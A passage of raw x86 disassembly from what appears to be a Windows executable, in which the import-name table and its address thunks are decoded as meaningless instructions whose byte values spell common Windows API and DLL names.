  42883d:	add    dl,BYTE PTR [ebx+0x65]
  428840:	je     0x428883
  428842:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428846:	gs push edi
  428848:	imul   ebp,DWORD PTR [esi+0x64],0x400776f
  42884f:	add    dl,BYTE PTR [edx+0x65]
  428852:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  42885a:	popa   
  42885b:	jae    0x4288d0
  42885d:	inc    ebp
  42885e:	js     0x4288b7
  428860:	add    BYTE PTR [eax],al
  428862:	and    DWORD PTR [edx],eax
  428864:	push   ebx
  428865:	outs   dx,BYTE PTR gs:[esi]
  428867:	fs inc esp
  428869:	ins    BYTE PTR es:[edi],dx
  42886a:	addr16 dec ecx
  42886c:	je     0x4288d3
  42886e:	ins    DWORD PTR es:[edi],dx
  42886f:	dec    ebp
  428870:	gs jae 0x4288e6
  428873:	popa   
  428874:	addr16 gs inc ecx
  428877:	add    BYTE PTR ds:0x74654701,bh
  42887d:	dec    ebp
  42887e:	gs jae 0x4288f4
  428881:	popa   
  428882:	addr16 gs push esp
  428885:	imul   ebp,DWORD PTR [ebp+0x65],0x1d0000
  42888c:	inc    ebx
  42888d:	popa   
  42888e:	jae    0x4288f3
  428890:	popa   
  428891:	fs gs push edi
  428894:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42889b:	add    bh,bl
  42889d:	add    BYTE PTR [ebp+0x78],al
  4288a0:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  4288a8:	jae    0x4288ef
  4288aa:	js     0x4288ac
  4288ac:	repnz add DWORD PTR [eax+0x6f],edx
  4288b0:	jae    0x428926
  4288b2:	dec    ebp
  4288b3:	gs jae 0x428929
  4288b6:	popa   
  4288b7:	addr16 gs push edi
  4288ba:	add    BYTE PTR [eax],al
  4288bc:	add    DWORD PTR fs:[edi+0x65],eax
  4288c0:	je     0x428917
  4288c2:	jo     0x428928
  4288c4:	popa   
  4288c5:	je     0x42892c
  4288c7:	push   edx
  4288c8:	outs   dx,BYTE PTR ds:[si]
  4288ca:	add    BYTE PTR [eax],al
  4288cc:	mov    BYTE PTR [edx],al
  4288ce:	push   esp
  4288cf:	popa   
  4288d0:	bound  esp,QWORD PTR [edx+0x65]
  4288d3:	fs push esp
  4288d5:	gs js  0x42894c
  4288d8:	dec    edi
  4288d9:	jne    0x42894f
  4288db:	push   edi
  4288dc:	add    BYTE PTR [eax],al
  4288de:	test   eax,0x616f4c01
  4288e3:	fs inc edx
  4288e5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb8004170
  4288ed:	add    BYTE PTR [edx+esi*2+0x61],al
  4288f1:	ja     0x428946
  4288f3:	je     0x428956
  4288f5:	je     0x42895c
  4288f7:	push   edi
  4288f8:	add    BYTE PTR [eax],al
  4288fa:	ja     0x4288fd
  4288fc:	inc    edi
  4288fd:	gs je  0x428957
  428900:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428907:	js     0x42897d
  428909:	dec    esp
  42890a:	outs   dx,BYTE PTR gs:[esi]
  42890c:	addr16 je 0x428977
  42890f:	push   edi
  428910:	add    BYTE PTR [eax],al
  428912:	cmp    BYTE PTR [eax],al
  428914:	inc    ebx
  428915:	push   0x70557261
  42891a:	jo     0x428981
  42891c:	jb     0x428960
  42891e:	jne    0x428986
  428920:	push   di
  428922:	add    BYTE PTR [eax],al
  428924:	daa    
  428925:	add    DWORD PTR [edi+0x65],eax
  428928:	je     0x428975
  42892a:	gs jns 0x42898f
  42892d:	outs   dx,DWORD PTR ds:[esi]
  42892e:	popa   
  42892f:	jb     0x428995
  428931:	push   esp
  428932:	jns    0x4289a4
  428934:	add    BYTE PTR gs:[ebx+0x1],cl
  428938:	inc    edi
  428939:	gs je  0x42898c
  42893c:	jb     0x4289ad
  42893e:	jo     0x428997
  428940:	add    BYTE PTR [eax],al
  428942:	dec    ebp
  428943:	add    BYTE PTR [ebx+0x6f],al
  428946:	jo     0x4289c1
  428948:	push   edx
  428949:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  42894e:	sub    eax,0x61684300
  428953:	jb     0x4289a3
  428955:	gs js  0x4289cc
  428958:	push   edi
  428959:	add    BYTE PTR [eax+0x43734901],dl
  42895f:	push   0x6f4c7261
  428964:	ja     0x4289cb
  428966:	jb     0x4289a9
  428968:	add    BYTE PTR [eax],al
  42896a:	sub    BYTE PTR [ecx],al
  42896c:	inc    edi
  42896d:	gs je  0x4289bc
  428970:	popa   
  428971:	jae    0x4289e7
  428973:	inc    ecx
  428974:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428978:	gs push eax
  42897a:	outs   dx,DWORD PTR ds:[esi]
  42897b:	jo     0x4289f2
  42897d:	jo     0x42897f
  42897f:	add    BYTE PTR [ebx+0x616f4c01],bh
  428985:	fs push ebx
  428987:	je     0x4289fb
  428989:	imul   ebp,DWORD PTR [esi+0x67],0x16d0041
  428990:	inc    edi
  428991:	gs je  0x4289eb
  428994:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  42899b:	outs   dx,BYTE PTR ds:[esi]
  42899c:	addr16 push edi
  42899e:	add    BYTE PTR [eax],al
  4289a0:	leave  
  4289a1:	add    DWORD PTR [ebp+0x61],ecx
  4289a4:	jo     0x4289fd
  4289a6:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  4289ad:	imul   ebp,DWORD PTR [esi+0x74],0x350073
  4289b4:	inc    ebx
  4289b5:	push   0x6f547261
  4289ba:	dec    edi
  4289bb:	gs ins DWORD PTR es:[edi],dx
  4289bd:	push   edi
  4289be:	add    BYTE PTR [eax],al
  4289c0:	push   ebp
  4289c1:	push   ebx
  4289c2:	inc    ebp
  4289c3:	push   edx
  4289c4:	xor    esi,DWORD PTR [edx]
  4289c6:	cs fs ins BYTE PTR es:[edi],dx
  4289c9:	ins    BYTE PTR es:[edi],dx
  4289ca:	add    BYTE PTR [eax],al
  4289cc:	xchg   edx,eax
  4289cd:	add    edx,DWORD PTR [edx+0x74]
  4289d0:	ins    BYTE PTR es:[edi],dx
  4289d1:	dec    ecx
  4289d2:	outs   dx,BYTE PTR ds:[esi]
  4289d3:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  4289db:	jb     0x428a46
  4289dd:	outs   dx,BYTE PTR ds:[esi]
  4289de:	add    BYTE PTR [bp+0x74],ch
  4289e2:	fs ins BYTE PTR es:[edi],dx
  4289e4:	ins    BYTE PTR es:[edi],dx
  4289e5:	cs fs ins BYTE PTR es:[edi],dx
  4289e8:	ins    BYTE PTR es:[edi],dx
  4289e9:	add    BYTE PTR ds:0x74654702,al
  4289ef:	dec    esp
  4289f0:	outs   dx,DWORD PTR ds:[esi]
  4289f1:	arpl   WORD PTR [ecx+0x6c],sp
  4289f4:	gs dec ecx
  4289f6:	outs   dx,BYTE PTR ds:[esi]
  4289f7:	outs   dx,WORD PTR ds:[esi]
  4289f9:	push   edi
  4289fa:	add    BYTE PTR [eax],al
  4289fc:	inc    ebp
  4289fd:	add    al,BYTE PTR [edi+0x65]
  428a00:	je     0x428a52
  428a02:	jb     0x428a73
  428a04:	arpl   WORD PTR [ecx+0x64],ax
  428a07:	fs jb  0x428a6f
  428a0a:	jae    0x428a7f
  428a0c:	add    BYTE PTR [eax],al
  428a0e:	rol    DWORD PTR [eax],cl
  428a10:	inc    ebx
  428a11:	jb     0x428a78
  428a13:	popa   
  428a14:	je     0x428a7b
  428a16:	inc    esi
  428a17:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  428a1f:	outs   dx,BYTE PTR ds:[esi]
  428a20:	addr16 push edi
  428a22:	add    BYTE PTR [eax],al
  428a24:	sub    BYTE PTR [ebx+edx*2],al
  428a27:	gs je  0x428a72
  428a2a:	popa   
  428a2b:	outs   dx,BYTE PTR ds:[esi]
  428a2c:	fs ins BYTE PTR es:[edi],dx
  428a2e:	gs inc ebx
  428a30:	outs   dx,DWORD PTR ds:[esi]
  428a31:	jne    0x428aa1
  428a33:	je     0x428a35
  428a35:	add    ah,bl
  428a37:	add    BYTE PTR [ebx+0x72],al
  428a3a:	gs popa 
  428a3c:	je     0x428aa3
  428a3e:	dec    ebp
  428a3f:	popa   
  428a40:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  428a48:	pop    DWORD PTR [ecx]
  428a4a:	inc    edi
  428a4b:	gs je  0x428a8f
  428a4e:	je     0x428abf
  428a50:	ins    DWORD PTR es:[edi],dx
  428a51:	dec    esi
  428a52:	popa   
  428a53:	ins    DWORD PTR es:[edi],dx
  428a54:	gs inc ecx
  428a56:	add    BYTE PTR [eax],al
  428a58:	pusha  
  428a59:	add    al,BYTE PTR [edi+0x65]
  428a5c:	je     0x428ab1
  428a5e:	jns    0x428ad3
  428a60:	je     0x428ac7
  428a62:	ins    DWORD PTR es:[edi],dx
  428a63:	push   edi
  428a64:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  428a6b:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  428a72:	jns    0x428ab5
  428a74:	add    BYTE PTR [eax],al
  428a76:	aas    
  428a77:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  428a7b:	fs dec esp
  428a7d:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  428a84:	add    BYTE PTR [eax],al
  428a86:	xchg   ecx,eax
  428a87:	add    al,BYTE PTR [edi+0x6c]
  428a8a:	outs   dx,DWORD PTR ds:[esi]
  428a8b:	bound  esp,QWORD PTR [ecx+0x6c]
  428a8e:	inc    ecx
  428a8f:	ins    BYTE PTR es:[edi],dx
  428a90:	ins    BYTE PTR es:[edi],dx
  428a91:	outs   dx,DWORD PTR ds:[esi]
  428a92:	arpl   WORD PTR [eax],ax
  428a94:	xchg   edx,eax
  428a95:	add    al,0x56
  428a97:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  428a9e:	jne    0x428b05
  428aa0:	jb     0x428b1b
  428aa2:	add    BYTE PTR [eax],al
  428aa4:	test   DWORD PTR [ecx],0x46746547
  428aaa:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  428ab2:	jb     0x428ab5
  428ab4:	inc    esi
  428ab5:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  428abc:	jne    0x428b30
  428abe:	arpl   WORD PTR [ebp+0x57],sp
  428ac1:	add    BYTE PTR [eax],bh
  428ac3:	add    ecx,DWORD PTR [ebp+0x6f]
  428ac6:	jbe    0x428b2d
  428ac8:	inc    esi
  428ac9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52037600
  428ad1:	popa   
  428ad2:	imul   esi,DWORD PTR [ebx+0x65],0x65637845
  428ad9:	jo     0x428b4f
  428adb:	imul   ebp,DWORD PTR [edi+0x6e],0x1920000
  428ae2:	inc    edi
  428ae3:	gs je  0x428b28
  428ae6:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  428aed:	jo     0x428b54
  428aef:	inc    ecx
  428af0:	add    BYTE PTR [eax],al
  428af2:	and    DWORD PTR [ebx+edx*2],eax
  428af5:	gs je  0x428b3e
  428af8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  428b00:	bound  esi,QWORD PTR [ebp+0x74]
  428b03:	gs jae 0x428b47
  428b06:	add    BYTE PTR [eax],al
  428b08:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  428b0c:	jbe    0x428b73
  428b0e:	inc    esi
  428b0f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xbf004178
  428b17:	add    BYTE PTR [ebx+0x6f],al
  428b1a:	jo     0x428b95
  428b1c:	inc    esi
  428b1d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x51037100
  428b25:	jne    0x428b8c
  428b27:	jb     0x428ba2
  428b29:	push   eax
  428b2a:	gs jb  0x428b93
  428b2d:	outs   dx,DWORD PTR ds:[esi]
  428b2e:	jb     0x428b9d
  428b30:	popa   
  428b31:	outs   dx,BYTE PTR ds:[esi]
  428b32:	arpl   WORD PTR [ebp+0x43],sp
  428b35:	outs   dx,DWORD PTR ds:[esi]
  428b36:	jne    0x428ba6
  428b38:	je     0x428b9f
  428b3a:	jb     0x428b3c
  428b3c:	sub    DWORD PTR [ebx+edx*2],eax
  428b3f:	gs je  0x428b8a
  428b42:	popa   
  428b43:	outs   dx,BYTE PTR ds:[esi]
  428b44:	fs ins BYTE PTR es:[edi],dx
  428b46:	gs dec ecx
  428b48:	outs   dx,BYTE PTR ds:[esi]
  428b49:	outs   dx,WORD PTR ds:[esi]
  428b4b:	jb     0x428bba
  428b4d:	popa   
  428b4e:	je     0x428bb9
  428b50:	outs   dx,DWORD PTR ds:[esi]
  428b51:	outs   dx,BYTE PTR ds:[esi]
  428b52:	add    BYTE PTR [eax],al
  428b54:	push   ss
  428b55:	add    DWORD PTR [ebp+0x6e],eax
  428b58:	je     0x428bbf
  428b5a:	jb     0x428b9f
  428b5c:	jb     0x428bc7
  428b5e:	je     0x428bc9
  428b60:	arpl   WORD PTR [ecx+0x6c],sp
  428b63:	push   ebx
  428b64:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  428b69:	outs   dx,BYTE PTR ds:[esi]
  428b6a:	add    BYTE PTR [eax],al
  428b6c:	jg     0x428b6f
  428b6e:	inc    esi
  428b6f:	outs   dx,DWORD PTR ds:[esi]
  428b70:	ins    BYTE PTR es:[edi],dx
  428b71:	fs push ebx
  428b73:	je     0x428be7
  428b75:	imul   ebp,DWORD PTR [esi+0x67],0x4dd0057
  428b7c:	ins    BYTE PTR es:[edi],dx
  428b7d:	jae    0x428bf3
  428b7f:	jb     0x428bed
  428b81:	outs   dx,BYTE PTR gs:[esi]
  428b83:	inc    ecx
  428b84:	add    BYTE PTR [eax],al
  428b86:	sahf   
  428b87:	add    DWORD PTR [edi+0x65],eax
  428b8a:	je     0x428bcf
  428b8c:	outs   dx,DWORD PTR ds:[esi]
  428b8d:	ins    DWORD PTR es:[edi],dx
  428b8e:	ins    DWORD PTR es:[edi],dx
  428b8f:	push   esp
  428b90:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  428b97:	add    BYTE PTR [edx+eax*1+0x47],dh
  428b9b:	gs je  0x428bf2
  428b9e:	push   0x64616572
  428ba3:	push   esp
  428ba4:	imul   ebp,DWORD PTR [ebp+0x65],0x4b000073
  428bab:	inc    ebp
  428bac:	push   edx
  428bad:	dec    esi
  428bae:	inc    ebp
  428baf:	dec    esp
  428bb0:	xor    esi,DWORD PTR [edx]
  428bb2:	cs fs ins BYTE PTR es:[edi],dx
  428bb5:	ins    BYTE PTR es:[edi],dx
  428bb6:	add    BYTE PTR [eax],al
  428bb8:	mov    dh,0x1
  428bba:	push   eax
  428bbb:	outs   dx,DWORD PTR ds:[esi]
  428bbc:	ins    BYTE PTR es:[edi],dx
  428bbd:	jns    0x428c26
  428bbf:	outs   dx,DWORD PTR ds:[esi]
  428bc0:	outs   dx,BYTE PTR ds:[esi]
  428bc1:	add    BYTE PTR [ecx+eax*1+0x47],ch
  428bc5:	gs je  0x428c17
  428bc8:	bound  ebp,QWORD PTR [edx+0x65]
  428bcb:	arpl   WORD PTR [edi+edx*2+0x0],si
  428bcf:	add    BYTE PTR [ebx+0x6c654400],dh
  428bd5:	gs je  0x428c3d
  428bd8:	inc    esp
  428bd9:	inc    ebx
  428bda:	add    BYTE PTR [eax],al
  428bdc:	rol    DWORD PTR [ecx],1
  428bde:	push   ebx
  428bdf:	gs ins BYTE PTR es:[edi],dx
  428be1:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428be6:	push   0x65
  428be8:	arpl   WORD PTR [eax+eax*1+0x0],si
  428bec:	jmp    0x428bef
  428bee:	push   ebx
  428bef:	gs je  0x428c3f
  428bf2:	popa   
  428bf3:	jo     0x428c42
  428bf5:	outs   dx,DWORD PTR ds:[esi]
  428bf6:	fs add BYTE PTR gs:[eax],al
  428bfa:	leave  
  428bfb:	add    DWORD PTR [edx+0x6f],edx
  428bfe:	jne    0x428c6e
  428c00:	fs push edx
  428c02:	arpl   WORD PTR gs:[eax+eax*1+0x76],si
  428c07:	add    BYTE PTR [edx+0x69],al
  428c0a:	je     0x428c4e
  428c0c:	ins    BYTE PTR es:[edi],dx
  428c0d:	je     0x428c0f
  428c0f:	add    BYTE PTR [ebx+0x61655201],bh
  428c15:	ins    BYTE PTR es:[edi],dx
  428c16:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428c1d:	je     0x428c93
  428c1f:	add    BYTE PTR gs:[eax],al
  428c22:	jge    0x428c25
  428c24:	inc    edi
  428c25:	gs je  0x428c7b
  428c28:	jns    0x428c9d
  428c2a:	je     0x428c91
  428c2c:	ins    DWORD PTR es:[edi],dx
  428c2d:	push   eax
  428c2e:	popa   
  428c2f:	ins    BYTE PTR es:[edi],dx
  428c30:	gs je  0x428ca7
  428c33:	gs push ebp
  428c35:	jae    0x428c9c
  428c37:	add    BYTE PTR [eax+0x74654701],cl
  428c3d:	push   esp
  428c3e:	gs js  0x428cb5
  428c41:	inc    ebp
  428c42:	js     0x428cb8
  428c44:	outs   dx,BYTE PTR gs:[esi]
  428c46:	je     0x428c98
  428c48:	outs   dx,DWORD PTR ds:[esi]
  428c49:	imul   ebp,DWORD PTR [esi+0x74],0x1cb0041
  428c50:	push   ebx
  428c51:	arpl   WORD PTR [ecx+0x6c],sp
  428c54:	gs push esi
  428c56:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  428c5d:	inc    ebp
  428c5e:	js     0x428cd4
  428c60:	inc    ebp
  428c61:	js     0x428c63
  428c63:	add    bh,cl
  428c65:	add    DWORD PTR [ebx+0x65],edx
  428c68:	ins    BYTE PTR es:[edi],dx
  428c69:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428c6e:	imul   esi,DWORD PTR [eax+0x52],0xfd006e67
  428c75:	add    DWORD PTR [ebx+0x65],edx
  428c78:	je     0x428cce
  428c7a:	gs js  0x428cf1
  428c7d:	inc    ebx
  428c7e:	outs   dx,DWORD PTR ds:[esi]
  428c7f:	ins    BYTE PTR es:[edi],dx
  428c80:	outs   dx,DWORD PTR ds:[esi]
  428c81:	jb     0x428c83
  428c83:	add    BYTE PTR [eax+0x74615001],ch
  428c89:	push   0x65526f54
  428c8e:	imul   ebp,DWORD PTR [bx+0x6e],0x810000
  428c96:	inc    ebx
  428c97:	outs   dx,DWORD PTR ds:[esi]
  428c98:	ins    DWORD PTR es:[edi],dx
  428c99:	bound  ebp,QWORD PTR [ecx+0x6e]
  428c9c:	gs push edx
  428c9e:	outs   dx,BYTE PTR ds:[si]
  428ca0:	add    BYTE PTR [eax],al
  428ca2:	lods   al,BYTE PTR ds:[esi]
  428ca3:	add    BYTE PTR [ebx+0x72],al
  428ca6:	gs popa 
  428ca8:	je     0x428d0f
  428caa:	push   edx
  428cab:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428cb0:	outs   dx,BYTE PTR ds:[esi]
  428cb1:	dec    ecx
  428cb2:	outs   dx,BYTE PTR ds:[esi]
  428cb3:	imul   esi,DWORD PTR fs:[edx+0x65],0x9a007463
  428cbb:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428cbf:	gs push esp
  428cc1:	outs   dx,DWORD PTR ds:[esi]
  428cc2:	add    BYTE PTR [eax],al
  428cc4:	mov    ds:0x65724300,al
  428cc9:	popa   
  428cca:	je     0x428d31
  428ccc:	dec    ecx
  428ccd:	inc    ebx
  428cce:	push   edi
  428ccf:	add    BYTE PTR [ebp+0x63655201],bh
  428cd5:	je     0x428d2d
  428cd7:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  428cde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cdf:	add    BYTE PTR [ebx+0x72],al
  428ce2:	gs popa 
  428ce4:	je     0x428d4b
  428ce6:	push   eax
  428ce7:	popa   
  428ce8:	ins    BYTE PTR es:[edi],dx
  428ce9:	gs je  0x428d60
  428cec:	add    BYTE PTR gs:[edi+0x44],al
  428cf0:	dec    ecx
  428cf1:	xor    esi,DWORD PTR [edx]
  428cf3:	cs fs ins BYTE PTR es:[edi],dx
  428cf6:	ins    BYTE PTR es:[edi],dx
	...
  428cff:	add    BYTE PTR [edi],bh
  428d01:	and    BYTE PTR [edx],al
	...
  428d1f:	add    BYTE PTR [ebx],bh
  428d21:	lea    eax,[edx]
	...
  428d2f:	add    BYTE PTR [ecx+0x64],ch
  428d32:	js     0x428d9d
  428d34:	outs   dx,DWORD PTR fs:[esi]
  428d36:	arpl   WORD PTR cs:[edi+0x6d],bp
  428d3a:	add    BYTE PTR [ebx+0x65],dl
  428d3d:	je     0x428d80
  428d3f:	outs   dx,BYTE PTR ds:[esi]
  428d40:	arpl   WORD PTR [eax+0x6f],bp
  428d43:	jb     0x428d94
  428d45:	jb     0x428db0
  428d47:	imul   ebp,DWORD PTR [bp+0x61],0x3231406c
  428d4f:	add    BYTE PTR [eax],al
  428d51:	add    BYTE PTR [eax],al
  428d53:	add    al,cl
  428d55:	test   DWORD PTR [edx],eax
  428d57:	add    ah,ah
  428d59:	test   DWORD PTR [edx],eax
  428d5b:	add    dh,dh
  428d5d:	test   DWORD PTR [edx],eax
  428d5f:	add    BYTE PTR [eax],cl
  428d61:	xchg   BYTE PTR [edx],al
  428d63:	add    BYTE PTR [eax],ah
  428d65:	xchg   BYTE PTR [edx],al
  428d67:	add    BYTE PTR [esi+eax*4],dh
  428d6a:	add    al,BYTE PTR [eax]
  428d6c:	dec    esi
  428d6d:	xchg   BYTE PTR [edx],al
  428d6f:	add    BYTE PTR [eax],al
  428d71:	add    BYTE PTR [eax],al
  428d73:	add    BYTE PTR [eax-0x7a],dh
  428d76:	add    al,BYTE PTR [eax]
  428d78:	mov    es,WORD PTR [esi-0x7963fffe]
  428d7e:	add    al,BYTE PTR [eax]
  428d80:	stos   BYTE PTR es:[edi],al
  428d81:	xchg   BYTE PTR [edx],al
  428d83:	add    BYTE PTR [esi-0x33fffd7a],bh
  428d89:	xchg   BYTE PTR [edx],al
  428d8b:	add    dh,bl
  428d8d:	xchg   BYTE PTR [edx],al
  428d8f:	add    al,dh
  428d91:	xchg   BYTE PTR [edx],al
  428d93:	add    dh,bh
  428d95:	xchg   BYTE PTR [edx],al
  428d97:	add    BYTE PTR [eax],dl
  428d99:	xchg   DWORD PTR [edx],eax
  428d9b:	add    BYTE PTR [edx],ah
  428d9d:	xchg   DWORD PTR [edx],eax
  428d9f:	add    BYTE PTR [eax],dh
  428da1:	xchg   DWORD PTR [edx],eax
  428da3:	add    BYTE PTR [esi],bh
  428da5:	xchg   DWORD PTR [edx],eax
  428da7:	add    BYTE PTR [eax-0x79],dl
  428daa:	add    al,BYTE PTR [eax]
  428dac:	pop    esp
  428dad:	xchg   DWORD PTR [edx],eax
  428daf:	add    BYTE PTR [edx-0x79],dh
  428db2:	add    al,BYTE PTR [eax]
  428db4:	test   BYTE PTR [edi-0x7869fffe],al
  428dba:	add    al,BYTE PTR [eax]
  428dbc:	mov    ds:0xb2000287,al
  428dc1:	xchg   DWORD PTR [edx],eax
  428dc3:	add    dl,al
  428dc5:	xchg   DWORD PTR [edx],eax
  428dc7:	add    al,bl
  428dc9:	xchg   DWORD PTR [edx],eax
  428dcb:	add    ah,ah
  428dcd:	xchg   DWORD PTR [edx],eax
  428dcf:	add    dh,dh
  428dd1:	xchg   DWORD PTR [edx],eax
  428dd3:	add    BYTE PTR [eax+ecx*4],cl
  428dd6:	add    al,BYTE PTR [eax]
  428dd8:	push   ds
  428dd9:	mov    BYTE PTR [edx],al
  428ddb:	add    BYTE PTR [eax+ecx*4],ch
  428dde:	add    al,BYTE PTR [eax]
  428de0:	cmp    al,0x88
  428de2:	add    al,BYTE PTR [eax]
  428de4:	dec    esi
  428de5:	mov    BYTE PTR [edx],al
  428de7:	add    BYTE PTR [edx-0x78],ah
  428dea:	add    al,BYTE PTR [eax]
  428dec:	js     0x428d76
  428dee:	add    al,BYTE PTR [eax]
  428df0:	mov    cl,BYTE PTR [eax-0x7763fffe]
  428df6:	add    al,BYTE PTR [eax]
  428df8:	lods   al,BYTE PTR ds:[esi]
  428df9:	mov    BYTE PTR [edx],al
  428dfb:	add    BYTE PTR [eax+ecx*4-0x7733fffe],bh
  428e02:	add    al,BYTE PTR [eax]
  428e04:	fimul  WORD PTR [eax-0x7713fffe]
  428e0a:	add    al,BYTE PTR [eax]
  428e0c:	cli    
  428e0d:	mov    BYTE PTR [edx],al
  428e0f:	add    BYTE PTR [edx],dl
  428e11:	mov    DWORD PTR [edx],eax
  428e13:	add    BYTE PTR [ecx+ecx*4],ah
  428e16:	add    al,BYTE PTR [eax]
  428e18:	mov    DWORD PTR ss:[edx],eax
  428e1b:	add    BYTE PTR [edx-0x77],al
  428e1e:	add    al,BYTE PTR [eax]
  428e20:	dec    esi
  428e21:	mov    DWORD PTR [edx],eax
  428e23:	add    BYTE PTR [edx-0x77],bl
  428e26:	add    al,BYTE PTR [eax]
  428e28:	push   0xffffff89
  428e2a:	add    al,BYTE PTR [eax]
  428e2c:	or     BYTE PTR [ecx-0x7671fffe],0x2
  428e33:	add    BYTE PTR [eax-0x4dfffd77],ah
  428e39:	mov    DWORD PTR [edx],eax
  428e3b:	add    BYTE PTR [eax],al
  428e3d:	add    BYTE PTR [eax],al
  428e3f:	add    ah,cl
  428e41:	mov    DWORD PTR [edx],eax
  428e43:	add    BYTE PTR [eax],al
  428e45:	add    BYTE PTR [eax],al
  428e47:	add    dl,ch
  428e49:	mov    DWORD PTR [edx],eax
  428e4b:	add    ah,bh
  428e4d:	mov    DWORD PTR [edx],eax
  428e4f:	add    BYTE PTR [esi],cl
  428e51:	mov    al,BYTE PTR [edx]
  428e53:	add    BYTE PTR [edx+ecx*4],ah
  428e56:	add    al,BYTE PTR [eax]
  428e58:	mov    al,BYTE PTR ss:[edx]
  428e5b:	add    BYTE PTR [eax-0x76],cl
  428e5e:	add    al,BYTE PTR [eax]
  428e60:	pop    eax
  428e61:	mov    al,BYTE PTR [edx]
  428e63:	add    BYTE PTR [esi-0x76],dh
  428e66:	add    al,BYTE PTR [eax]
  428e68:	xchg   BYTE PTR [edx-0x756bfffe],cl
  428e6e:	add    al,BYTE PTR [eax]
  428e70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e71:	mov    al,BYTE PTR [edx]
  428e73:	add    BYTE PTR [edx-0x3dfffd76],dh
  428e79:	mov    al,BYTE PTR [edx]
  428e7b:	add    dh,cl
  428e7d:	mov    al,BYTE PTR [edx]
  428e7f:	add    al,ah
  428e81:	mov    al,BYTE PTR [edx]
  428e83:	add    dl,dh
  428e85:	mov    al,BYTE PTR [edx]
  428e87:	add    BYTE PTR [eax],cl
  428e89:	mov    eax,DWORD PTR [edx]
  428e8b:	add    BYTE PTR [esi],dl
  428e8d:	mov    eax,DWORD PTR [edx]
  428e8f:	add    BYTE PTR [edx],ah
  428e91:	mov    eax,DWORD PTR [edx]
  428e93:	add    BYTE PTR [ebx+ecx*4],bh
  428e96:	add    al,BYTE PTR [eax]
  428e98:	push   esp
  428e99:	mov    eax,DWORD PTR [edx]
  428e9b:	add    BYTE PTR [ebx+ecx*4+0x2],ch
  428e9f:	add    BYTE PTR [edx-0x75],bh
  428ea2:	add    al,BYTE PTR [eax]
  428ea4:	xchg   BYTE PTR [ebx-0x7467fffe],cl
  428eaa:	add    al,BYTE PTR [eax]
  428eac:	add    BYTE PTR [eax],al
  428eae:	add    BYTE PTR [eax],al
  428eb0:	mov    eax,0xc200028b
  428eb5:	mov    eax,DWORD PTR [edx]
  428eb7:	add    al,dl
  428eb9:	mov    eax,DWORD PTR [edx]
  428ebb:	add    ah,bl
  428ebd:	mov    eax,DWORD PTR [edx]
  428ebf:	add    ah,ch
  428ec1:	mov    eax,DWORD PTR [edx]
  428ec3:	add    dl,bh
  428ec5:	mov    eax,DWORD PTR [edx]
  428ec7:	add    BYTE PTR [esi],al
  428ec9:	mov    WORD PTR [edx],es
  428ecb:	add    BYTE PTR [eax],dl
  428ecd:	mov    WORD PTR [edx],es
  428ecf:	add    BYTE PTR [edx],ah
  428ed1:	mov    WORD PTR [edx],es
  428ed3:	add    BYTE PTR [eax],bh
  428ed5:	mov    WORD PTR [edx],es
  428ed7:	add    BYTE PTR [esi-0x74],cl
  428eda:	add    al,BYTE PTR [eax]
  428edc:	mov    WORD PTR fs:[edx],es
  428edf:	add    BYTE PTR [esp+ecx*4+0x2],dh
  428ee3:	add    BYTE PTR [esp+ecx*4-0x736bfffe],al
  428eea:	add    al,BYTE PTR [eax]
  428eec:	mov    ds:0xba00028c,al
  428ef1:	mov    WORD PTR [edx],es
  428ef3:	add    ah,al
  428ef5:	mov    WORD PTR [edx],es
  428ef7:	add    al,dl
  428ef9:	mov    WORD PTR [edx],es
  428efb:	add    dh,bl
  428efd:	mov    WORD PTR [edx],es
  428eff:	add    BYTE PTR [eax],al
  428f01:	add    BYTE PTR [eax],al
	...
